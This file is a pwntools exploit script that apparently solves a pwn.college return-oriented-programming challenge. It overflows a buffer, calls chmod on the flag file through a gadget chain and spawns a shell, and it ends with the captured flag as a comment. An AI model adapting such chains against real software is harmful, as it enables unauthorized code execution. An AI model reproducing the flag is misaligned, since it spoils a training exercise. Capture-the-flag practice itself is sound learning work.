from pwn import *

elf = ELF("./babyrop_level4.0")
s = ssh(host="dojo.pwn.college", user="hacker", keyfile="~/key")
pop_rax = 0x0000000000402073
pop_rdi = 0x0000000000402093
pop_rsi = 0x000000000040207b
syscall = 0x000000000040209b

io = s.process("/challenge/babyrop_level4.0")
io.recvuntil(b'[LEAK] Your input buffer is located at: ')
stack = int(io.recvline()[:-2], 16)
info("Leak stack: " + hex(stack))

chain = b'/flag\x00'
chain += b'a' * (0x88 - len(chain))
chain += p64(pop_rax) + p64(0x5a) + p64(pop_rdi) + p64(stack) + p64(pop_rsi) + p64(7) + p64(syscall)
io.send(chain)
io.close()

sh = s.shell(b'/bin/bin')
sh.interactive()
# Flag: pwn.college{gulH9g1UiUdJJ7UeNdkXobFPo_-.01N0MDLxIjNyEzW}